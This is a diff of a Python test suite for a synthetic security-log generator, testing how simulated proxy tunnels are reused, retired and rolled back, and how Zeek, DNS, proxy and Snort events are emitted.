+        setup_cs = proxy_events[0].protocol.proxy.transaction.tunnel_setup_cs_bytes
+        setup_sc = proxy_events[0].protocol.proxy.transaction.tunnel_setup_sc_bytes
+        assert setup_cs + sum(event.protocol.proxy.cs_bytes for event in proxy_events) <= (
+            client_events[0].network.orig_bytes
+        )
+        assert setup_sc + sum(event.protocol.proxy.sc_bytes for event in proxy_events) <= (
+            client_events[0].network.resp_bytes
+        )
+        census = generator._proxy_channel_manager.census()
+        assert census.open_tunnel_views == 1
+        assert census.application.used_operation_ids == 3
+
+    def test_proxy_manager_exact_auth_affinity_miss_opens_new_transport(self):
+        """Changing authenticated proxy identity must fence transport reuse."""
+
+        generator, emitters = _generator(
+            [
+                NetworkSensor(
+                    type="network",
+                    name="both-sides",
+                    monitoring_segments=["workstations", "dmz"],
+                    direction="bidirectional",
+                    log_formats=["zeek"],
+                )
+            ]
+        )
+        contexts = [
+            ProxyContext(
+                client_ip="10.0.1.10",
+                username=username,
+                method="GET",
+                url=f"https://example.com/{index}",
+                host="example.com",
+                status_code=200,
+                sc_bytes=1800,
+                cs_bytes=240,
+                user_agent="Mozilla/5.0",
+                cache_result="MISS",
+                proxy_fqdn="PROXY-01.example.org",
+                proxy_action="ssl-inspect",
+            )
+            for index, username in enumerate(("EXAMPLE\\alice", "EXAMPLE\\alice", "EXAMPLE\\bob"))
+        ]
+        generator._build_proxy_context = Mock(side_effect=contexts)
+        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+        uids: list[str] = []
+        physical_counts: list[int] = []
+        for index in range(3):
+            uids.append(
+                generator.generate_connection(
+                    src_ip="10.0.1.10",
+                    dst_ip="93.184.216.34",
+                    time=start_time + timedelta(seconds=index * 8),
+                    dst_port=443,
+                    service="ssl",
+                    duration=45.0 if index == 0 else 0.2,
+                    orig_bytes=240,
+                    resp_bytes=1800,
+                    source_system=generator._ip_to_system["10.0.1.10"],
+                    hostname="example.com",
+                    http=HttpContext(
+                        method="GET",
+                        host="example.com",
+                        uri=f"/{index}",
+                        user_agent="Mozilla/5.0",
+                        response_body_len=1600,
+                        flow_request_body_len=300 if index == 0 else None,
+                        flow_response_body_len=4200 if index == 0 else None,
+                        flow_transaction_count=3 if index == 0 else 1,
+                        trans_depth=index + 1,
+                    ),
+                )
+            )
+            physical_counts.append(emitters["zeek_conn"].emit.call_count)
+
+        assert uids[1] == uids[0]
+        assert physical_counts[1] == physical_counts[0]
+        assert uids[2] != uids[0]
+        assert physical_counts[2] == physical_counts[1] + 2
+
+    def test_cache_hit_reuses_open_tunnel_and_denial_retires_it(self):
+        """Cache-only children reuse setup, while terminal policy errors fence later reuse."""
+
+        generator, emitters = _generator(
+            [
+                NetworkSensor(
+                    type="network",
+                    name="both-sides",
+                    monitoring_segments=["workstations", "dmz"],
+                    direction="bidirectional",
+                    log_formats=["zeek"],
+                )
+            ]
+        )
+        generator._build_proxy_context = Mock(
+            side_effect=[
+                ProxyContext(
+                    client_ip="10.0.1.10",
+                    method="GET",
+                    url="https://example.com/",
+                    host="example.com",
+                    status_code=200,
+                    sc_bytes=2400,
+                    cs_bytes=260,
+                    user_agent="Mozilla/5.0",
+                    cache_result="MISS",
+                    proxy_fqdn="PROXY-01.example.org",
+                ),
+                ProxyContext(
+                    client_ip="10.0.1.10",
+                    method="GET",
+                    url="https://example.com/cached.js",
+                    host="example.com",
+                    status_code=200,
+                    sc_bytes=1600,
+                    cs_bytes=220,
+                    user_agent="Mozilla/5.0",
+                    cache_result="HIT",
+                    proxy_fqdn="PROXY-01.example.org",
+                ),
+                ProxyContext(
+                    client_ip="10.0.1.10",
+                    method="GET",
+                    url="https://example.com/blocked",
+                    host="example.com",
+                    status_code=403,
+                    sc_bytes=700,
+                    cs_bytes=210,
+                    user_agent="Mozilla/5.0",
+                    cache_result="DENIED",
+                    proxy_fqdn="PROXY-01.example.org",
+                ),
+            ]
+        )
+        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+
+        def emit(index: int, *, status_code: int = 200) -> str:
+            return generator.generate_connection(
+                src_ip="10.0.1.10",
+                dst_ip="93.184.216.34",
+                time=start_time + timedelta(seconds=index * 8),
+                dst_port=443,
+                service="ssl",
+                duration=45.0 if index == 0 else 0.2,
+                orig_bytes=260,
+                resp_bytes=2400,
+                source_system=generator._ip_to_system["10.0.1.10"],
+                hostname="example.com",
+                http=HttpContext(
+                    method="GET",
+                    host="example.com",
+                    uri=f"/{index}",
+                    user_agent="Mozilla/5.0",
+                    response_body_len=1500,
+                    flow_request_body_len=600 if index == 0 else None,
+                    flow_response_body_len=6000 if index == 0 else None,
+                    flow_transaction_count=3 if index == 0 else 1,
+                    trans_depth=index + 1,
+                    status_code=status_code,
+                ),
+            )
+
+        first_uid = emit(0)
+        physical_after_first = emitters["zeek_conn"].emit.call_count
+        cached_uid = emit(1)
+        assert cached_uid == first_uid
+        assert emitters["zeek_conn"].emit.call_count == physical_after_first
+        cached_event = emitters["proxy_access"].emit.call_args.args[0]
+        assert cached_event.protocol.proxy.cache_result == "HIT"
+        assert cached_event.protocol.proxy.transaction.reused_transport is True
+        assert cached_event.protocol.proxy.transaction.terminal_outcome == "cache_hit"
+
+        denied_uid = emit(2, status_code=403)
+        assert denied_uid == first_uid
+        assert emitters["zeek_conn"].emit.call_count == physical_after_first
+        denied_event = emitters["proxy_access"].emit.call_args.args[0]
+        assert denied_event.network.application_layer_only is True
+        assert denied_event.protocol.proxy.transaction.reused_transport is True
+        assert denied_event.protocol.proxy.transaction.terminal_outcome == "denied"
+        assert generator._proxy_channel_manager.census().open_tunnel_views == 0
+
+    def test_terminal_reuse_last_precommit_rejection_preserves_open_tunnel(self):
+        """An authority rejection cancels terminal retirement and every staged root effect."""
+
+        from evidenceforge.generation.activity.helpers import _get_rng
+
+        generator, emitters = _generator(
+            [
+                NetworkSensor(
+                    type="network",
+                    name="both-sides",
+                    monitoring_segments=["workstations", "dmz"],
+                    direction="bidirectional",
+                    log_formats=["zeek"],
+                )
+            ]
+        )
+        generator._build_proxy_context = Mock(
+            side_effect=[
+                ProxyContext(
+                    client_ip="10.0.1.10",
+                    method="GET",
+                    url="https://example.com/",
+                    host="example.com",
+                    status_code=200,
+                    sc_bytes=2400,
+                    cs_bytes=260,
+                    user_agent="Mozilla/5.0",
+                    cache_result="MISS",
+                    proxy_fqdn="PROXY-01.example.org",
+                ),
+                ProxyContext(
+                    client_ip="10.0.1.10",
+                    method="GET",
+                    url="https://example.com/blocked",
+                    host="example.com",
+                    status_code=403,
+                    sc_bytes=700,
+                    cs_bytes=210,
+                    user_agent="Mozilla/5.0",
+                    cache_result="DENIED",
+                    proxy_fqdn="PROXY-01.example.org",
+                ),
+            ]
+        )
+        start = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+        generator.generate_connection(
+            src_ip="10.0.1.10",
+            dst_ip="93.184.216.34",
+            time=start,
+            dst_port=443,
+            service="ssl",
+            duration=45.0,
+            orig_bytes=600,
+            resp_bytes=6000,
+            source_system=generator._ip_to_system["10.0.1.10"],
+            hostname="example.com",
+            http=HttpContext(
+                method="GET",
+                host="example.com",
+                uri="/",
+                user_agent="Mozilla/5.0",
+                response_body_len=2400,
+                flow_request_body_len=600,
+                flow_response_body_len=6000,
+                flow_transaction_count=2,
+            ),
+        )
+        manager_before = generator._proxy_channel_manager.census()
+        assert manager_before.open_tunnel_views == 1
+        assert manager_before.application.open_channels == 1
+        state_before = generator.state_manager.materialization_digest()
+        rng_before = _get_rng().getstate()
+        runtime_before = generator._network_transaction_runtime.census()
+        timing_before = generator.timing_runtime.audit.snapshot()
+        source_timing_before = generator._source_timing_planner.census()
+        output_before = {name: emitter.emit.call_count for name, emitter in emitters.items()}
+
+        def reject_last_precommit() -> None:
+            raise StateError("injected terminal last-precommit rejection")
+
+        generator._lifecycle_authority._materialization_precommit_hook = reject_last_precommit
+        try:
+            with pytest.raises(StateError, match="injected terminal last-precommit rejection"):
+                generator.generate_connection(
+                    src_ip="10.0.1.10",
+                    dst_ip="93.184.216.34",
+                    time=start + timedelta(seconds=8),
+                    dst_port=443,
+                    service="ssl",
+                    duration=0.2,
+                    orig_bytes=210,
+                    resp_bytes=700,
+                    source_system=generator._ip_to_system["10.0.1.10"],
+                    hostname="example.com",
+                    http=HttpContext(
+                        method="GET",
+                        host="example.com",
+                        uri="/blocked",
+                        user_agent="Mozilla/5.0",
+                        response_body_len=700,
+                        trans_depth=2,
+                        status_code=403,
+                    ),
+                )
+        finally:
+            generator._lifecycle_authority._materialization_precommit_hook = None
+
+        manager_after = generator._proxy_channel_manager.census()
+        assert manager_after.open_tunnel_views == manager_before.open_tunnel_views
+        assert manager_after.application.open_channels == manager_before.application.open_channels
+        assert manager_after.application.used_operation_ids == (
+            manager_before.application.used_operation_ids
+        )
+        assert manager_after.prepared_admissions == 0
+        assert manager_after.application.prepared_admissions == 0
+        assert generator.state_manager.materialization_digest() == state_before
+        assert _get_rng().getstate() == rng_before
+        assert generator._network_transaction_runtime.census() == runtime_before
+        assert generator.timing_runtime.audit.snapshot() == timing_before
+        assert generator._source_timing_planner.census() == source_timing_before
+        assert {
+            name: emitter.emit.call_count for name, emitter in emitters.items()
+        } == output_before
+
+    @pytest.mark.parametrize("failure_mode", ["tampered_snapshot", "stale_generation"])
+    def test_deferred_reuse_snapshot_rejection_is_boundary_neutral(
+        self,
+        monkeypatch: pytest.MonkeyPatch,
+        failure_mode: str,
+    ) -> None:
+        """Tampered pre-boundary or stale in-boundary snapshots leave no staged residue."""
+
+        from evidenceforge.generation.activity.helpers import _get_rng
+
+        generator, emitters = _generator(
+            [
+                NetworkSensor(
+                    type="network",
+                    name="both-sides",
+                    monitoring_segments=["workstations", "dmz"],
+                    direction="bidirectional",
+                    log_formats=["zeek"],
+                )
+            ]
+        )
+        generator._build_proxy_context = Mock(
+            side_effect=[
+                ProxyContext(
+                    client_ip="10.0.1.10",
+                    method="GET",
+                    url="https://example.com/",
+                    host="example.com",
+                    status_code=200,
+                    sc_bytes=2400,
+                    cs_bytes=260,
+                    user_agent="Mozilla/5.0",
+                    cache_result="MISS",
+                    proxy_fqdn="PROXY-01.example.org",
+                ),
+                ProxyContext(
+                    client_ip="10.0.1.10",
+                    method="GET",
+                    url="https://example.com/cached.js",
+                    host="example.com",
+                    status_code=200,
+                    sc_bytes=700,
+                    cs_bytes=210,
+                    user_agent="Mozilla/5.0",
+                    cache_result="HIT",
+                    proxy_fqdn="PROXY-01.example.org",
+                ),
+            ]
+        )
+        start = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+        generator.generate_connection(
+            src_ip="10.0.1.10",
+            dst_ip="93.184.216.34",
+            time=start,
+            dst_port=443,
+            service="ssl",
+            duration=45.0,
+            orig_bytes=600,
+            resp_bytes=6000,
+            source_system=generator._ip_to_system["10.0.1.10"],
+            hostname="example.com",
+            http=HttpContext(
+                method="GET",
+                host="example.com",
+                uri="/",
+                user_agent="Mozilla/5.0",
+                response_body_len=2400,
+                flow_request_body_len=600,
+                flow_response_body_len=6000,
+                flow_transaction_count=2,
+            ),
+        )
+        if failure_mode == "tampered_snapshot":
+            original_snapshot = generator._proxy_channel_manager.snapshot_request
+
+            def tampered_snapshot(*args: object, **kwargs: object):
+                snapshot = original_snapshot(*args, **kwargs)
+                assert snapshot is not None
+                return replace(
+                    snapshot,
+                    requested_at=snapshot.requested_at + timedelta(microseconds=1),
+                )
+
+            monkeypatch.setattr(
+                generator._proxy_channel_manager,
+                "snapshot_request",
+                tampered_snapshot,
+            )
+            expected_error = "authentic proxy request snapshot"
+        else:
+            original_prepare = ExplicitProxyRequestPreparation.prepare
+
+            def stale_generation(
+                preparation: ExplicitProxyRequestPreparation,
+                *,
+                manager: ExplicitProxyChannelManager,
+                timing_runtime: object,
+            ):
+                registry = manager.application_registry
+                channel_id = preparation.snapshot.tunnel.channel_id
+                routed = registry._channel_route(channel_id)
+                assert routed is not None
+                _route, shard_id, channel_handle = routed
+                shard = registry._owner_shard(shard_id, create=False)
+                assert shard is not None
+                with shard.lock:
+                    retained = shard.channels.delete(channel_handle)
+                    assert shard.channels.insert(retained) == channel_handle
+                return original_prepare(
+                    preparation,
+                    manager=manager,
+                    timing_runtime=timing_runtime,  # type: ignore[arg-type]
+                )
+
+            monkeypatch.setattr(ExplicitProxyRequestPreparation, "prepare", stale_generation)
+            expected_error = "snapshot is stale"
+
+        manager_before = generator._proxy_channel_manager.census()
+        state_before = generator.state_manager.materialization_digest()
+        rng_before = _get_rng().getstate()
+        runtime_before = generator._network_transaction_runtime.census()
+        timing_before = generator.timing_runtime.audit.snapshot()
+        source_timing_before = generator._source_timing_planner.census()
+        output_before = {name: emitter.emit.call_count for name, emitter in emitters.items()}
+        with pytest.raises(StateError, match=expected_error):
+            generator.generate_connection(
+                src_ip="10.0.1.10",
+                dst_ip="93.184.216.34",
+                time=start + timedelta(seconds=8),
+                dst_port=443,
+                service="ssl",
+                duration=0.2,
+                orig_bytes=210,
+                resp_bytes=700,
+                source_system=generator._ip_to_system["10.0.1.10"],
+                hostname="example.com",
+                http=HttpContext(
+                    method="GET",
+                    host="example.com",
+                    uri="/cached.js",
+                    user_agent="Mozilla/5.0",
+                    response_body_len=700,
+                    trans_depth=2,
+                ),
+            )
+
+        manager_after = generator._proxy_channel_manager.census()
+        assert manager_after.open_tunnel_views == manager_before.open_tunnel_views
+        assert manager_after.application.open_channels == manager_before.application.open_channels
+        assert manager_after.application.used_operation_ids == (
+            manager_before.application.used_operation_ids
+        )
+        assert manager_after.prepared_admissions == 0
+        assert manager_after.application.prepared_admissions == 0
+        assert generator.state_manager.materialization_digest() == state_before
+        assert _get_rng().getstate() == rng_before
+        assert generator._network_transaction_runtime.census() == runtime_before
+        assert generator.timing_runtime.audit.snapshot() == timing_before
+        assert generator._source_timing_planner.census() == source_timing_before
+        assert {
+            name: emitter.emit.call_count for name, emitter in emitters.items()
+        } == output_before
+
+    @pytest.mark.soak
+    def test_production_proxy_channel_state_plateaus_at_24h_7d_and_30d(
+        self,
+        monkeypatch: pytest.MonkeyPatch,
+    ):
+        """Hourly production transactions must leave duration-flat manager backing state."""
+
+        start_time = datetime(2024, 1, 1, tzinfo=UTC)
+        end_time = start_time + timedelta(days=30)
+        generator, emitters = _generator(
+            [],
+            generation_window_start=start_time,
+            generation_window_end=end_time,
+        )
+        monkeypatch.setattr(generator, "_maybe_emit_ocsp_transaction", Mock(return_value=None))
+        horizons = {24, 24 * 7, 24 * 30}
+        snapshots = {}
+
+        for hour in range(24 * 30):
+            event_time = start_time + timedelta(hours=hour)
+            generator.state_manager.set_current_time(event_time)
+            generator.generate_connection(
+                src_ip="10.0.1.10",
+                dst_ip="93.184.216.34",
+                time=event_time,
+                dst_port=443,
+                service="ssl",
+                duration=4.0,
+                orig_bytes=280,
+                resp_bytes=1400,
+                source_system=generator._ip_to_system["10.0.1.10"],
+                hostname="example.com",
+                suppress_source_pid_inference=True,
+                http=HttpContext(
+                    method="GET",
+                    host="example.com",
+                    uri=f"/hour/{hour}",
+                    user_agent="Mozilla/5.0",
+                    response_body_len=1200,
+                    trans_depth=1,
+                ),
+            )
+            generator.advance_application_channel_watermark(event_time + timedelta(hours=1))
+            for emitter in emitters.values():
+                emitter.reset_mock()
+            if hour + 1 in horizons:
+                snapshots[hour + 1] = generator._proxy_channel_manager.census()
+
+        for census in snapshots.values():
+            assert census.open_tunnel_views == 0
+            assert census.tunnel_expiry_entries == 0
+            assert census.sidecar_compaction_pending == 0
+            assert census.application.retained_channels == 0
+            assert census.application.route_entries == 0
+            assert census.application.route_compaction_pending == 0
+        day = snapshots[24]
+        week = snapshots[24 * 7]
+        month = snapshots[24 * 30]
+        assert week.sidecar_estimated_bytes <= day.sidecar_estimated_bytes * 1.10
+        assert month.sidecar_estimated_bytes <= week.sidecar_estimated_bytes * 1.10
+        assert month.sidecar_allocated_slots <= max(1, day.sidecar_allocated_slots)
+        assert month.application.estimated_index_bytes <= max(
+            1,
+            week.application.estimated_index_bytes,
+        )
+
+    def test_proxy_manager_does_not_reuse_or_retain_at_exclusive_output_boundary(
+        self,
+        monkeypatch: pytest.MonkeyPatch,
+    ):
+        """A request at window end is omitted without mutating bounded channel state."""
+
+        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+        end_time = start_time + timedelta(minutes=2)
+        generator, emitters = _generator(
+            [],
+            generation_window_start=start_time,
+            generation_window_end=end_time,
+        )
+        monkeypatch.setattr(generator, "_maybe_emit_ocsp_transaction", Mock(return_value=None))
+        generator.dispatcher.output_start_time = start_time
+        generator.dispatcher.output_end_time = end_time
+
+        first_uid = generator.generate_connection(
+            src_ip="10.0.1.10",
+            dst_ip="93.184.216.34",
+            time=start_time,
+            dst_port=443,
+            service="ssl",
+            duration=60.0,
+            orig_bytes=300,
+            resp_bytes=2400,
+            source_system=generator._ip_to_system["10.0.1.10"],
+            hostname="example.com",
+            http=HttpContext(
+                method="GET",
+                host="example.com",
+                uri="/",
+                user_agent="Mozilla/5.0",
+                response_body_len=2200,
+                flow_request_body_len=450,
+                flow_response_body_len=4800,
+                flow_transaction_count=2,
+                trans_depth=1,
+            ),
+        )
+        assert first_uid
+        assert generator._proxy_channel_manager.census().open_tunnel_views == 1
+        calls_before_boundary = {
+            name: emitter.emit.call_count for name, emitter in emitters.items()
+        }
+
+        boundary_uid = generator.generate_connection(
+            src_ip="10.0.1.10",
+            dst_ip="93.184.216.34",
+            time=end_time,
+            dst_port=443,
+            service="ssl",
+            duration=0.2,
+            orig_bytes=180,
+            resp_bytes=900,
+            source_system=generator._ip_to_system["10.0.1.10"],
+            hostname="example.com",
+            http=HttpContext(
+                method="GET",
+                host="example.com",
+                uri="/late.js",
+                user_agent="Mozilla/5.0",
+                response_body_len=800,
+                trans_depth=2,
+            ),
+        )
+
+        assert boundary_uid != first_uid
+        assert {
+            name: emitter.emit.call_count for name, emitter in emitters.items()
+        } == calls_before_boundary
+        generator.advance_application_channel_watermark(end_time)
+        census = generator._proxy_channel_manager.census()
+        assert census.open_tunnel_views == 0
+        assert census.application.retained_channels == 0
+
+    @pytest.mark.slow
+    def test_tight_https_requests_open_transports_when_payload_capacity_is_consumed(self):
+        generator, emitters = _generator(
+            [
+                NetworkSensor(
+                    type="network",
+                    name="both-sides",
+                    monitoring_segments=["workstations", "dmz"],
+                    direction="bidirectional",
+                    log_formats=["zeek"],
+                )
+            ]
+        )
+        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+        seen_uids: set[str] = set()
 
         for idx in range(12):
             uid = generator.generate_connection(
@@ -3733,7 +5166,7 @@ class TestExplicitProxyVisibility:
                 dst_port=443,
                 proto="tcp",
                 service="ssl",
-                duration=1.0,
+                duration=60.0,
                 orig_bytes=500,
                 resp_bytes=5000,
                 source_system=generator._ip_to_system["10.0.1.10"],
@@ -3751,25 +5184,18 @@ class TestExplicitProxyVisibility:
                     status_msg="OK",
                 ),
             )
-            if idx == 0:
-                first_uid = uid
-                pairs_after_first = list(_conn_pairs(emitters))
-            else:
-                assert uid == first_uid
-                assert _conn_pairs(emitters) == pairs_after_first
+            seen_uids.add(uid)
 
         assert emitters["proxy_access"].emit.call_count == 12
+        assert len(seen_uids) == 12
         app_layer_proxy_events = [
             call.args[0]
             for call in emitters["proxy_access"].emit.call_args_list
             if call.args[0].network.application_layer_only
         ]
-        assert len(app_layer_proxy_events) == 11
-        assert {event.protocol.proxy.url for event in app_layer_proxy_events} == {
-            f"https://example.com/api/export/qlattice?page={idx}" for idx in range(2, 13)
-        }
+        assert app_layer_proxy_events == []
 
-    def test_https_request_after_tunnel_timeout_emits_new_transport(self):
+    def test_https_request_after_transport_close_emits_new_transport(self):
         generator, emitters = _generator(
             [
                 NetworkSensor(
@@ -3812,7 +5238,7 @@ class TestExplicitProxyVisibility:
         second_uid = generator.generate_connection(
             src_ip="10.0.1.10",
             dst_ip="93.184.216.34",
-            time=start_time + timedelta(seconds=300),
+            time=start_time + timedelta(seconds=12),
             dst_port=443,
             proto="tcp",
             service="ssl",
@@ -3940,7 +5366,7 @@ class TestExplicitProxyVisibility:
             dst_port=443,
             proto="tcp",
             service="ssl",
-            duration=1.0,
+            duration=15.0,
             orig_bytes=500,
             resp_bytes=5000,
             source_system=generator._ip_to_system["10.0.1.10"],
@@ -3989,7 +5415,7 @@ class TestExplicitProxyVisibility:
                 status_msg="OK",
             ),
         )
-        assert emitters["snort_alert"].emit.call_count == 2
+        assert emitters["snort_alert"].emit.call_count == 4
 
     def test_denied_request_stops_before_origin_side_sources(self):
         generator, emitters = _generator(
@@ -4058,10 +5484,12 @@ class TestExplicitProxyVisibility:
             http=HttpContext(
                 method="GET",
                 host="example.com",
-                uri="/private",
+                uri="/CitrixWorkspaceApp.exe",
                 version="1.1",
                 status_code=200,
                 status_msg="OK",
+                response_body_len=75_000_000,
+                resp_mime_types=["application/x-msdownload"],
             ),
             ids_alerts=(
                 IdsAlertPlan(
@@ -4990,11 +6418,18 @@ class TestExplicitProxyVisibility:
             if plan.resolver_mode != "ordinary_lookup":
                 continue
             selected_plan = plan
-            dns_event = emitters["zeek_dns"].emit.call_args.args[0]
+            dns_event = next(
+                call.args[0]
+                for call in emitters["zeek_dns"].emit.call_args_list
+                if call.args[0].dns.query == "example.com"
+                and call.args[0].dns.qtype in {1, 28}
+                and call.args[0].lifecycle.parent_group_id == plan.stable_id
+            )
             origin_event = next(
                 call.args[0]
                 for call in emitters["zeek_conn"].emit.call_args_list
                 if call.args[0].network.src_ip == "10.0.3.10"
+                and call.args[0].network.protocol == "tcp"
                 and call.args[0].network.dst_port == 80
             )
             break
@@ -5059,15 +6494,19 @@ class TestExplicitProxyVisibility:
         proxy_event = emitters["proxy_access"].emit.call_args.args[0]
         transaction = proxy_event.protocol.proxy.transaction
         assert transaction is not None
+        origin_dns_events = [
+            event
+            for event in dns_events
+            if event.dns.query == "example.com" and event.dns.qtype in {1, 28}
+        ]
+        assert all(event.network.src_ip == "10.0.3.10" for event in dns_events)
+        assert all(event.network.dst_ip == "10.0.0.1" for event in dns_events)
         if transaction.resolver_mode == "resolver_cache_hit":
-            assert not dns_events
+            assert not origin_dns_events
         else:
-            assert dns_events
-            assert all(event.network.src_ip == "10.0.3.10" for event in dns_events)
-            assert all(event.network.dst_ip == "10.0.0.1" for event in dns_events)
-            assert all("10.0.0.1" not in event.dns.answers for event in dns_events)
-            assert all(event.dns.query != "PROXY-01.example.org" for event in dns_events)
-            assert any(event.dns.query == "example.com" for event in dns_events)
+            assert origin_dns_events
+            assert all("10.0.0.1" not in event.dns.answers for event in origin_dns_events)
+        assert all(event.dns.query != "PROXY-01.example.org" for event in dns_events)
 
     def test_scenario_identity_overrides_preserved_proxy_origin_ip(self):
         generator, emitters = _generator(
